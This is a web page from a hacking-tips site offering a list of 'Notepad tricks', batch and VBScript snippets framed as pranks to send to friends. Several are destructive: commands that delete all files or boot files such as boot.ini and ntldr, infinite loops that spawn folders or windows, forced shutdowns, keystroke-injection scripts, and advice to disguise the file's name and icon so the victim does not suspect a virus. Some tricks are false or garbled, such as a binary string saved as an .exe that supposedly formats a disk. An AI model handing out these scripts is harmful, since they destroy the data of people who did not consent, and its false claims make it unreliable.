<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Notepad Hacking</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="files with a small command!
     Copy the following code into your
     notepad and save it as a .bat
     file.
     del *.*
     All your files in your hard disk will
     vanish in less than 5mins." />
	<meta name="keywords" content="How to Delete all your system,RAM crashing trick,How to create more than 3,000 folders under a minute,Notepad Trick to shutdown computer forcefully,Notepad Trick to Lock Folders,Open Notepad continually in your friend,s computer,Notepad Trick to Format Hard disk,Matrix Notepad Trick,Notepad trick to Test Antivirus,How to Shutdown a computer forever,Crash a Computer System With,Notepad trick to use it as a Diary,Notepad Trick to Open DVD Drive,Notepad Trick to annoy your friends,Notepad Trick to type slowly,Infinite Notepad Trick,Notepad Trick - Text to Audio,Notepad Trick - BUSH HID THE FACTS,Notepad Trick Print Tree Root,World Trade Center Notepad Trick,Frustrate your friend by making this VBScript hit Backspace simultaneously,Hack your friend,s keyboard and make him type,You are a fool,simultaneously,Wish Good Day on Boot,Create a Password Protected VBScript Message,Create a Message Box Loop" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link href="css/95.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance563" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li class="active"><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li class="active"><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance564" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance568" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>1. How to Delete all your system</strong></span></h1>

<p><span style="color:#bebebe;">     files with a small command!</span></p>

<p><span style="color:#bebebe;">     Copy the following code into your</span></p>

<p><span style="color:#bebebe;">     notepad and save it as a .bat</span></p>

<p><span style="color:#bebebe;">     file.</span></p>

<p><span style="color:#bebebe;">     del *.*</span></p>

<p><span style="color:#bebebe;">     All your files in your hard disk will</span></p>

<p><span style="color:#bebebe;">     vanish in less than 5mins.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>2. RAM crashing trick</strong></span></h1>

<p><span style="color:#bebebe;">     open notepad and type</span></p>

<p><span style="color:#bebebe;">     :A</span></p>

<p><span style="color:#bebebe;">     start http://www.haktuts.com/</span></p>

<p><span style="color:#bebebe;">     goto A</span></p>

<p><span style="color:#bebebe;">     save with .bat extension.</span></p>

<p><span style="color:#bebebe;">     Infinitely loops your browser to</span></p>

<p><span style="color:#bebebe;">     open up http://www.haktuts.com/</span></p>

<p> </p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>3. How to create more than 3,000 folders under a minute</strong></span></h1>

<p><span style="color:#bebebe;">     Open your notepad and type</span></p>

<p><span style="color:#bebebe;">     the following code.</span></p>

<p><span style="color:#bebebe;">     @echo off</span></p>

<p><span style="color:#bebebe;">     :top</span></p>

<p><span style="color:#bebebe;">     md %random%</span></p>

<p><span style="color:#bebebe;">     goto top</span></p>

<p><span style="color:#bebebe;">     Save it as any.bat</span></p>

<p><span style="color:#bebebe;">     @echo off makes your screen</span></p>

<p><span style="color:#bebebe;">     appear blank but it is actually</span></p>

<p><span style="color:#bebebe;">     making hundreds of folders.</span></p>

<p><span style="color:#bebebe;">     md %random% is command that</span></p>

<p><span style="color:#bebebe;">     creating folders with random</span></p>

<p><span style="color:#bebebe;">     names.( md is a command to</span></p>

<p><span style="color:#bebebe;">     make directory in ms-dos)</span></p>

<p><span style="color:#bebebe;">     goto top – return the command</span></p>

<p><span style="color:#bebebe;">     to :top, causes an infinite loop.</span></p>

<p><span style="color:#bebebe;">     NOTE: The folders will get created</span></p>

<p><span style="color:#bebebe;">      in the directory where you saved</span></p>

<p><span style="color:#bebebe;">      the ”any.bat” file.</span></p>

<p><span style="color:#bebebe;">     The file might look suspicious to</span></p>

<p><span style="color:#bebebe;">      your friends. So if you are</span></p>

<p><span style="color:#bebebe;">      looking to fool your friends, then</span></p>

<p><span style="color:#bebebe;">      change the file name and also</span></p>

<p><span style="color:#bebebe;">      the icon so that he doesn’t</span></p>

<p><span style="color:#bebebe;">      suspect the file to be a virus.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>4. Notepad Trick to shutdown computer forcefully</strong></span></h1>

<p><span style="color:#bebebe;">      Open Notepad.</span></p>

<p><span style="color:#bebebe;">      Paste the following code in it:</span></p>

<p><span style="color:#bebebe;">      @echo off</span></p>

<p><span style="color:#bebebe;">       msg * Shutdown computer.</span></p>

<p><span style="color:#bebebe;">      shutdown -c “Sleep Tight” -s</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>5) Notepad Trick to Lock Folders</strong></span></h1>

<p><span style="color:#bebebe;">     Lets lock a folder using notepad trick which is named as PICS in your D: drive , whose path is        </span></p>

<p><span style="color:#bebebe;">     D:PICS</span></p>

<p><span style="color:#bebebe;">     Then the code should be something like this:</span></p>

<p><span style="color:#bebebe;">     ren pics pics. {21EC2020-3AEA-1069- A2DD-08002B30309D}</span></p>

<p><span style="color:#bebebe;">     Pics is your folder name. Use the name of the folder in place for pics. Save the text file as lock.bat in      </span></p>

<p><span style="color:#bebebe;">     the same drive.</span></p>

<p><span style="color:#bebebe;">     To unlock this locked folder:</span></p>

<p><span style="color:#bebebe;">     Open another new notepad text file and type the following:</span></p>

<p><span style="color:#bebebe;">     ren pics. {21EC2020-3AEA-1069- A2DD-08002B30309D} pics</span></p>

<p><span style="color:#bebebe;">     Save the text file as key.bat in the same drive. Here again, pics is the name of the folder. Change it  </span></p>

<p><span style="color:#bebebe;">     to the folder name you want to lock it.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"><strong>6.Open Notepad continually in your friend's computer:</strong></span></h1>

<p><span style="color:#bebebe;"><strong> </strong>    @ECHO off</span></p>

<p><span style="color:#bebebe;">     :top</span></p>

<p><span style="color:#bebebe;">     START %SystemRoot%\system32\notepad.exe</span></p>

<p><span style="color:#bebebe;">     GOTO top</span></p>

<p><span style="color:#bebebe;">     Save it as "Anything.BAT" and send it.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">7. Notepad Trick to Format Hard disk</span></h1>

<p><span style="color:#bebebe;">       Open Notepad and type:</span></p>

<p><span style="color:#bebebe;">       a) Code : 01001011000111110010010101010101010000011111100000</span></p>

<p><span style="color:#bebebe;">       b) Save As it as anything.EXE</span></p>

<p><span style="color:#bebebe;">       c) Run it. Beware that the entire HDD will be erased</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">8. Matrix Notepad Trick</span></h1>

<p><span style="color:#bebebe;">      @echo off</span></p>

<p><span style="color:#bebebe;">       color 2</span></p>

<p><span style="color:#bebebe;">      :start</span></p>

<p><span style="color:#bebebe;">       echo %random% %random% % random% %random% %random % %random% %random% %      </span></p>

<p><span style="color:#bebebe;">       random% %random% %random % %random% %random% % random% %random%</span></p>

<p><span style="color:#bebebe;">       goto start</span></p>

<p><span style="color:#bebebe;">       Save this file as any.bat</span></p>

<p><span style="color:#bebebe;">       Make sure the file type is kept as ALL FILES while saving it as a .bat file.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">9. Notepad trick to Test Antivirus   </span></h1>

<p><span style="color:#bebebe;">      Open Notepad.</span></p>

<p><span style="color:#bebebe;">      Copy the code give below in the notepad file:</span></p>

<p><span style="color:#bebebe;">      X5O!P%@AP[4PZX54(P^) 7CC)7}$EICAR-STANDARD- ANTIVIRUS-TEST-FILE!$H+H*</span></p>

<p><span style="color:#bebebe;">      Save it with an .exe extension like testvirus.exe</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">10. How to Shutdown a computer forever?</span></h1>

<p><span style="color:#bebebe;">      Now Please don’t try this because this is the most simplest and deadliest hack for your windows     </span></p>

<p><span style="color:#bebebe;">      computer. Copy the following</span></p>

<p><span style="color:#bebebe;">      code into your notepad</span></p>

<p><span style="color:#bebebe;">      @echo off</span></p>

<p><span style="color:#bebebe;">       attrib -r -s -h c:\autoexec.bat</span></p>

<p><span style="color:#bebebe;">      del c:\autoexec.bat</span></p>

<p><span style="color:#bebebe;">      attrib -r -s -h c:\boot.ini</span></p>

<p><span style="color:#bebebe;">      del c:\boot.ini</span></p>

<p><span style="color:#bebebe;">      attrib -r -s -h c:\ntldr</span></p>

<p><span style="color:#bebebe;">      del c:\ntldr</span></p>

<p><span style="color:#bebebe;">      attrib -r -s -h c:\windows</span></p>

<p><span style="color:#bebebe;">      \win.ini</span></p>

<p><span style="color:#bebebe;">      del c:\windows\win.ini</span></p>

<p><span style="color:#bebebe;">      Save it as “shutdown-</span></p>

<p><span style="color:#bebebe;">      forever.bat”. Just make sure it</span></p>

<p><span style="color:#bebebe;">      has a .bat or .cmd extension.</span></p>

<p><span style="color:#bebebe;">     DONT RUN THE BATCH FILE ,YOU</span></p>

<p><span style="color:#bebebe;">     WONT RECOVER BACK AFTER YOU</span></p>

<p><span style="color:#bebebe;">     RUN IT !!!</span></p>

<p><span style="color:#bebebe;">     This should shutdown the persons computer. It shuts it off once</span></p>

<p><span style="color:#bebebe;">      and deletes the files needed to reboot and restart.So please, use</span></p>

<p><span style="color:#bebebe;">      this hack only if you have no intention of rebooting your computer again. So just be careful.</span></p>

<p><span style="color:#bebebe;">     Here’s an alternative code.</span></p>

<p><span style="color:#bebebe;">     cmd /c del c:\windows\* /F /S /</span></p>

<p><span style="color:#bebebe;">     Q</span></p>

<p><span style="color:#bebebe;">     cmd /c del c:\* /F /S /Q</span></p>

<p><span style="color:#bebebe;">     Paste it in NotePad And Save It</span></p>

<p><span style="color:#bebebe;">     with Extension .cmd or .bat.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">11. Crash a Computer System With</span></h1>

<p><span style="color:#bebebe;">      This is a javascript “exploit” , it</span></p>

<p><span style="color:#bebebe;">      will hang/crash your system. It</span></p>

<p><span style="color:#bebebe;">       basically floods you with an</span></p>

<p><span style="color:#bebebe;">       infinite loop of mailto:xxx</span></p>

<p><span style="color:#bebebe;">       windows. To cancel this (and you</span></p>

<p><span style="color:#bebebe;">       have to move fast) kill the</span></p>

<p><span style="color:#bebebe;">       process of your email client</span></p>

<p><span style="color:#bebebe;">       before you run out of RAM. Every</span></p>

<p><span style="color:#bebebe;">       instance occupies about 1000</span></p>

<p><span style="color:#bebebe;">       bytes, if your victim is smart, he</span></p>

<p><span style="color:#bebebe;">       better end the process As soon as</span></p>

<p><span style="color:#bebebe;">       possible or he will be forced to</span></p>

<p><span style="color:#bebebe;">       reboot his computer.</span></p>

<p><span style="color:#bebebe;">       WARNING This Link WILL CRASH</span></p>

<p><span style="color:#bebebe;">      YOUR BROWSER OR WORSE, YOUR</span></p>

<p><span style="color:#bebebe;">      COMPUTER !!!!</span></p>

<p><span style="color:#bebebe;">      Click Here</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">12. Notepad trick to use it as a Diary</span></h1>

<p><span style="color:#bebebe;">      Open notepad</span></p>

<p><span style="color:#bebebe;">       Type .LOG</span></p>

<p><span style="color:#bebebe;">       Save the file as LOG.txt</span></p>

<p><span style="color:#bebebe;">       Write anything in it and it will be saved with the time when you edit it.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">13. Notepad Trick to Open DVD Drive</span></h1>

<p><span style="color:#bebebe;">       Open Notepad.</span></p>

<p><span style="color:#bebebe;">       Copy the code given below onto the notepad file:</span></p>

<p><span style="color:#bebebe;">       Set oWMP = CreateObject(“WMPlayer.OCX.7?)</span></p>

<p><span style="color:#bebebe;">       Set colCDROMs = oWMP.cdromCollection</span></p>

<p><span style="color:#bebebe;">       do</span></p>

<p><span style="color:#bebebe;">       if colCDROMs.Count &gt;= 1 then</span></p>

<p><span style="color:#bebebe;">       For i = 0 to colCDROMs.Count – 1</span></p>

<p><span style="color:#bebebe;">       colCDROMs.Item(i).Eject</span></p>

<p><span style="color:#bebebe;">       Next</span></p>

<p><span style="color:#bebebe;">       For i = 0 to colCDROMs.Count – 1</span></p>

<p><span style="color:#bebebe;">       colCDROMs.Item(i).Eject</span></p>

<p><span style="color:#bebebe;">       Next</span></p>

<p><span style="color:#bebebe;">       End If</span></p>

<p><span style="color:#bebebe;">      wscript.sleep 5000</span></p>

<p><span style="color:#bebebe;">       loop</span></p>

<p><span style="color:#bebebe;">       Save it as “Anything.VBS”.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">14. Notepad Trick to annoy your friends</span></h1>

<p><span style="color:#bebebe;">      Open Notepad.</span></p>

<p><span style="color:#bebebe;">      Paste the following code in the notepad file:</span></p>

<p><span style="color:#bebebe;">      @ECHO off</span></p>

<p><span style="color:#bebebe;">      :Begin</span></p>

<p><span style="color:#bebebe;">       msg * Hey</span></p>

<p><span style="color:#bebebe;">       msg * Want to have Fun?</span></p>

<p><span style="color:#bebebe;">       msg * You do?</span></p>

<p><span style="color:#bebebe;">       msg * We will both have fun, alright?</span></p>

<p><span style="color:#bebebe;">       msg * More fun?</span></p>

<p><span style="color:#bebebe;">       GOTO BEGIN</span></p>

<p><span style="color:#bebebe;">      Save the file with any file name but with .bat as extension and close it. For eg. cool.bat</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">15. Notepad Trick to type slowly</span></h1>

<p><span style="color:#bebebe;">       Open Notepad.</span></p>

<p><span style="color:#bebebe;">       Paste the following code in the notepad file:</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 180000</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 10000</span></p>

<p><span style="color:#bebebe;">       Set WshShell = WScript.CreateObject (“WScript.Shell”)</span></p>

<p><span style="color:#bebebe;">       WshShell.Run “notepad”</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 100</span></p>

<p><span style="color:#bebebe;">       WshShell.AppActivate Notepad“”</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">       WshShell.SendKeys “Hel”</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">       WshShell.SendKeys “lo ”</span></p>

<p><span style="color:#bebebe;">       WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">      WshShell.SendKeys “, ho”</span></p>

<p><span style="color:#bebebe;">      WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">      WshShell.SendKeys “w a”</span></p>

<p><span style="color:#bebebe;">      WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">      WshShell.SendKeys “re ”</span></p>

<p><span style="color:#bebebe;">      WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">      WshShell.SendKeys “you”</span></p>

<p><span style="color:#bebebe;">      WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">      WshShell.SendKeys “? ”</span></p>

<p><span style="color:#bebebe;">      WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys “I a”</span></p>

<p><span style="color:#bebebe;">     WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys “m g”</span></p>

<p><span style="color:#bebebe;">     WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys “ood”</span></p>

<p><span style="color:#bebebe;">     WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys ” th”</span></p>

<p><span style="color:#bebebe;">     WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys “ank”</span></p>

<p><span style="color:#bebebe;">     WScript.Sleep 500</span></p>

<p><span style="color:#bebebe;">     WshShell.SendKeys “s! “</span></p>

<p><span style="color:#bebebe;">     Save the file with any name and with .vbs extension and close it.</span></p>

<p><span style="color:#bebebe;">     Now open the file and see how freakishly slow the messages appear!</span></p>

<p><span style="color:#bebebe;">     NOTE: In order to stop it. Follow the “Note” given in 10th Trick.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">16. Infinite Notepad Trick</span></h1>

<p><span style="color:#bebebe;">      Open Notepad.</span></p>

<p><span style="color:#bebebe;">      Paste the following code in your notepad file:</span></p>

<p><span style="color:#bebebe;">      @ECHO off</span></p>

<p><span style="color:#bebebe;">      :top</span></p>

<p><span style="color:#bebebe;">      START %SystemRoot% system32notepad.exe</span></p>

<p><span style="color:#bebebe;">      GOTO top</span></p>

<p><span style="color:#bebebe;">      Save the file with any name nut with .bat extension and close it.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">17. Notepad Trick - Text to Audio</span></h1>

<p><span style="color:#bebebe;">       Open Notepad file on your Windows PC.</span></p>

<p><span style="color:#bebebe;">       Copy and paste the below mentioned code :</span></p>

<p><span style="color:#bebebe;">       Dim msg, sapi</span></p>

<p><span style="color:#bebebe;">       msg=InputBox("Enter your text for conversion www–.haktuts.com","haktuts Text-To-Audio      </span></p>

<p><span style="color:#bebebe;">       Converter")</span></p>

<p><span style="color:#bebebe;">       Set sapi=CreateObject ("sapi.spvoice")</span></p>

<p><span style="color:#bebebe;">       sapi.Speak msg</span></p>

<p><span style="color:#bebebe;">       Save this file with any name with .vbs as extension. For eg. Text-To- Audio.vbs</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">18. Notepad Trick - BUSH HID THE FACTS</span></h1>

<p><span style="color:#bebebe;">      Open notepad.</span></p>

<p><span style="color:#bebebe;">      Type BUSH HID THE FACTS</span></p>

<p><span style="color:#bebebe;">      Save that file.</span></p>

<p><span style="color:#bebebe;">      Close it</span></p>

<p><span style="color:#bebebe;">      Open It Again See…</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">19. Notepad Trick Print Tree Root</span></h1>

<p><span style="color:#bebebe;">       Open NOTEPAD and enter {print tree root}</span></p>

<p><span style="color:#bebebe;">       After that hit enter and type C:windowssystem</span></p>

<p><span style="color:#bebebe;">       After that hit enter and type {print C:windowssystemwinlog</span></p>

<p><span style="color:#bebebe;">       Hit enter and type 4*43?$@[455] 3hr4~</span></p>

<p><span style="color:#bebebe;">       Then save the file as teekids in C:windowssystem.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">20. World Trade Center Notepad Trick</span></h1>

<p><span style="color:#bebebe;">       Open your Notepad</span></p>

<p><span style="color:#bebebe;">       Type the flight number Q33N</span></p>

<p><span style="color:#bebebe;">       Increase the Font Size to 72</span></p>

<p><span style="color:#bebebe;">       Change the Font to Wingdings</span></p>

<p> </p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">21.Frustrate your friend by making this VBScript hit Backspace simultaneously:</span></h1>

<p><span style="color:#bebebe;">      MsgBox "Let's go back a few steps"</span></p>

<p><span style="color:#bebebe;">      Set wshShell =wscript.CreateObject("WScript.Shell")</span></p>

<p><span style="color:#bebebe;">      do</span></p>

<p><span style="color:#bebebe;">      wscript.sleep 100</span></p>

<p><span style="color:#bebebe;">      wshshell.sendkeys "{bs}"</span></p>

<p><span style="color:#bebebe;">      loop</span></p>

<p><span style="color:#bebebe;">     Save it as "Anything.VBS" and send it.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">22. Hack your friend's keyboard and make him type "You are a fool"        simultaneously:</span></h1>

<p><span style="color:#bebebe;">      Set wshShell = wscript.CreateObject("WScript.Shell")</span></p>

<p><span style="color:#bebebe;">       do</span></p>

<p><span style="color:#bebebe;">       wscript.sleep 100</span></p>

<p><span style="color:#bebebe;">       wshshell.sendkeys "You are a fool."</span></p>

<p><span style="color:#bebebe;">       loop</span></p>

<p><span style="color:#bebebe;">       Save it as "Anything.VBS" and send it.</span></p>

<p> </p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">23. Hard prank: Pick your poison batch file. It asks your friend to choose a number between 1-5      and then does a certain action:</span></h1>

<p> </p>

<p><span style="color:#bebebe;">      1: Shutdown</span></p>

<p><span style="color:#bebebe;">      2: Restart</span></p>

<p><span style="color:#bebebe;">      3: Wipes out your hard drive (BEWARE)</span></p>

<p><span style="color:#bebebe;">      4: Net send</span></p>

<p><span style="color:#bebebe;">      5: Messages then shutdown</span></p>

<p><span style="color:#bebebe;">       @echo off</span></p>

<p><span style="color:#bebebe;">        title The end of the world</span></p>

<p><span style="color:#bebebe;">        cd C:\</span></p>

<p><span style="color:#bebebe;">       :menu</span></p>

<p><span style="color:#bebebe;">        cls</span></p>

<p><span style="color:#bebebe;">        echo I take no responsibility for your actions. Beyond this point it is you that has the power to kill          </span></p>

<p><span style="color:#bebebe;">        yourself. If you press 'x' then your PC will be formatted. Do not come crying to me when you fried</span></p>

<p><span style="color:#bebebe;">        your computer or if you lost your project etc...</span></p>

<p><span style="color:#bebebe;">         pause</span></p>

<p><span style="color:#bebebe;">         echo Pick your poison:</span></p>

<p><span style="color:#bebebe;">        echo 1. Die this way (Wimp)</span></p>

<p><span style="color:#bebebe;">        echo 2. Die this way (WIMP!)</span></p>

<p><span style="color:#bebebe;">        echo 3. DO NOT DIE THIS WAY</span></p>

<p><span style="color:#bebebe;">        echo 4. Die this way (you're boring)</span></p>

<p><span style="color:#bebebe;">       echo 5. Easy way out</span></p>

<p><span style="color:#bebebe;">       set input=nothing</span></p>

<p><span style="color:#bebebe;">       set /p input=Choice:</span></p>

<p><span style="color:#bebebe;">       if %input%==1 goto one</span></p>

<p><span style="color:#bebebe;">       if %input%==2 goto two</span></p>

<p><span style="color:#bebebe;">      Save it as "Anything.BAT" and send it. </span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;">24: Wish Good Day on Boot</span></h1>

<p><span style="color:#bebebe;">        Wish a Good day to anyone who logs in to your PC with their name.</span></p>

<p><span style="color:#bebebe;">        Open Notepad.</span></p>

<p><span style="color:#bebebe;">        Right Click &gt; New &gt; Text Document</span></p>

<p><span style="color:#bebebe;">        Copy and Paste below code in Notepad.</span></p>

<p><span style="color:#bebebe;">        name=inputbox("What's your name?")</span></p>

<p><span style="color:#bebebe;">        msgbox("Have a good day, ") + name</span></p>

<p><span style="color:#bebebe;">        NOTE: You can Change Quoted Text according to yourself.</span></p>

<p><span style="color:#bebebe;">        Save the file as 'Welcome.vbs' and Double click to Open it &amp; Check if it is working or not.</span></p>

<p><span style="color:#bebebe;">        Now Copy the 'Welcome.vbs' file and Paste it in Start-up folder if you want to see this script on          </span></p>

<p><span style="color:#bebebe;">        boot.</span></p>

<p><span style="color:#bebebe;">        Click Here to know How to Locate Start-Up Folder</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"> 25: Create a Password Protected VBScript Message</span></h1>

<p><span style="color:#bebebe;">        Use this trick to create a VBScript with password protection.</span></p>

<p><span style="color:#bebebe;">        Open Notepad.</span></p>

<p><span style="color:#bebebe;">        Right Click &gt; New &gt; Text Document</span></p>

<p><span style="color:#bebebe;">        Copy &amp; Paste below code in Notepad.</span></p>

<p><span style="color:#bebebe;">        pass=inputbox("Enter Password...")</span></p>

<p><span style="color:#bebebe;">        if pass="password" then msgbox("Your Message Here..") else msgbox("Incorrect Password! </span></p>

<p><span style="color:#bebebe;">        Exiting... ")</span></p>

<p><span style="color:#bebebe;">        Note: Change the highlighted text 'Your Message Here.. ' with you message. &amp;</span></p>

<p><span style="color:#bebebe;">        password with your own Password.</span></p>

<p><span style="color:#bebebe;">        Save the file as 'Message.vbs'.</span></p>

<p><span style="color:#bebebe;">        Now you will have to enter the password if you want to see the Message. Default Password is         </span></p>

<p><span style="color:#bebebe;">        'password'. You can change it by changing the highlighted text in code.</span></p>

<p> </p>

<h1 class="wb-stl-heading1"><span style="color:#bebebe;"> 26: Create a Message Box Loop</span></h1>

<p><span style="color:#bebebe;">          Open Notepad.</span></p>

<p><span style="color:#bebebe;">          Right Click &gt; New &gt; Text Document</span></p>

<p><span style="color:#bebebe;">          Copy and Paste below code in Notepad.</span></p>

<p><span style="color:#bebebe;">           msgbox("Hello!")</span></p>

<p><span style="color:#bebebe;">           DO</span></p>

<p><span style="color:#bebebe;">           msgbox("Hello, Again!")</span></p>

<p><span style="color:#bebebe;">           LOOP</span></p>

<p><span style="color:#bebebe;">           NOTE: You can change the Keywords Hello &amp; Hello Again with your messages. 'Hello!' will be         </span></p>

<p><span style="color:#bebebe;">           shown only once &amp; 'Hello, Again!' will loop until you stop this script.</span></p>

<p><span style="color:#bebebe;">           Save the file as 'Loop.vbs'.</span></p>

<p><span style="color:#bebebe;">           Double click on Loop.vbs file to open it. Click Here to know How to Stop this Trick.</span></p>

<p> </p>

<p> </p>
</div><div id="wb_element_instance569" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(95);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance569");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance569").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance565" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance566" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance567" class="wb_element"><div id="wb_element_instance567_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance567_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance567_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance567_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance567_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance567_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance567_toolbox"); }
			</script></div><div id="wb_element_instance570" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>